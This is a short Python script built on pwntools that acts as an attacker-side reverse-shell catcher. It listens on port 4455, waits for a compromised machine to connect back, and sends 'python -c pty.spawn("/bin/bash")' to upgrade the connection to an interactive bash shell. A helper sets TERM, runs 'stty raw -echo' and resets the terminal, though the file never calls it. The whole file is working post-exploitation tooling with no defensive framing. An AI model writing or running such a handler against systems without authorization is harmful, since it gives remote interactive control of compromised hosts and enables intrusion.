from pwn import *

host = "0.0.0.0"
port = 4455

def stabilize_linux_session(conn):
    conn.sendline(b"export TERM=xterm")  
    conn.sendline(b"stty raw -echo")  
    conn.sendline(b"reset") 
    conn.sendline(b"python -c 'import pty; pty.spawn(\"/bin/bash\")'") 
    conn.sendline(b"echo 'Shell upgraded!'")


def start_listener():

    listener = listen(port)
    print(f"[+] Listening on {host}:{listener.lport}...")

    conn = listener.wait_for_connection()
    conn.sendline(b"python -c 'import pty; pty.spawn(\"/bin/bash\")'")

    try:
        conn.interactive()

    except Exception as e:
        print(f"[!] Error while upgrading shell: {e}")

    finally:
        conn.close()
        listener.close()
    return True